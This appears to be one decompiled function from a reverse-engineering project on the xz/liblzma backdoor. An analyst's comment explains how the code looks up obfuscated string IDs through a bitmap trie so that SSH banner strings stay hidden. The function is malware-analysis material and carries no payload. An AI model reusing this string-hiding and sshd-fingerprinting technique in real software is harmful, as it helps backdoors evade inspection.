// /home/kali/xzre-ghidra/xzregh/10A880_get_string_id.c
// Function: get_string_id @ 0x10A880
// Calling convention: __stdcall
// Prototype: EncodedStringId __stdcall get_string_id(char * string_begin, char * string_end)


/*
 * AutoDoc: Maps runtime strings to EncodedStringId identifiers without shipping plaintext literals. Each call logs itself via
 * secret_data_append_from_address, clamps the scan to 0x2c bytes, and walks two packed bitmaps (_Lcrc64_clmul_1+0x760 and the
 * string_action_data trie) while repeatedly calling count_bits to compute the next child index. It returns the encoded ID when it
 * reaches a terminal node or 0 when the bytes miss the trie, and is used to find SSH banner strings during sshd heuristics.
 */

#include "xzre_types.h"

EncodedStringId get_string_id(char *string_begin,char *string_end)

{
  ushort *node_entry;
  long bit_index;
  ushort child_flags;
  ushort child_offset;
  BOOL logged;
  uint bitmap_rank;
  byte ch;
  ushort node_flags;
  ulong *bitmap_row;
  byte *scan_limit;
  long trie_cursor;
  ulong bitmap_word;
  
  logged = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0xa,8,1);
  if (logged != FALSE) {
    scan_limit = (byte *)(string_begin + 0x2c);
    if ((string_end != (char *)0x0) && (string_end < scan_limit)) {
      scan_limit = (byte *)string_end;
    }
    trie_cursor = 0x10c2a8;
    bitmap_row = (ulong *)(_Lcrc64_clmul_1 + 0x760);
    for (; (string_begin <= scan_limit && (ch = *string_begin, -1 < (char)ch));
        string_begin = (char *)((byte *)string_begin + 1)) {
      if (ch < 0x40) {
        bitmap_word = *bitmap_row;
        bitmap_rank = 0;
        if ((bitmap_word >> (ch & 0x3f) & 1) == 0) {
          return 0;
        }
      }
      else {
        bitmap_word = bitmap_row[1];
        ch = ch - 0x40;
        if ((bitmap_word >> (ch & 0x3f) & 1) == 0) {
          return 0;
        }
        bitmap_rank = count_bits(*bitmap_row);
      }
      while( TRUE ) {
        bit_index = 0;
        if (bitmap_word != 0) {
          for (; (bitmap_word >> bit_index & 1) == 0; bit_index = bit_index + 1) {
          }
        }
        if ((uint)bit_index == (uint)ch) break;
        bitmap_rank = bitmap_rank + 1;
        bitmap_word = bitmap_word & bitmap_word - 1;
      }
      node_entry = (ushort *)(trie_cursor + (ulong)bitmap_rank * 4);
      node_flags = *node_entry;
      child_offset = node_entry[1];
      if ((node_flags & 4) != 0) {
        return (int)(short)child_offset;
      }
      if ((node_flags & 2) == 0) {
        child_offset = -child_offset;
      }
      else {
        node_flags = node_flags & 0xfffd;
      }
      child_flags = node_flags & 0xfffe;
      if ((node_flags & 1) == 0) {
        child_flags = -node_flags;
      }
      trie_cursor = trie_cursor + (short)(child_offset - 4);
      bitmap_row = (ulong *)((long)bitmap_row + (long)(short)(child_flags - 0x10));
    }
  }
  return 0;
}

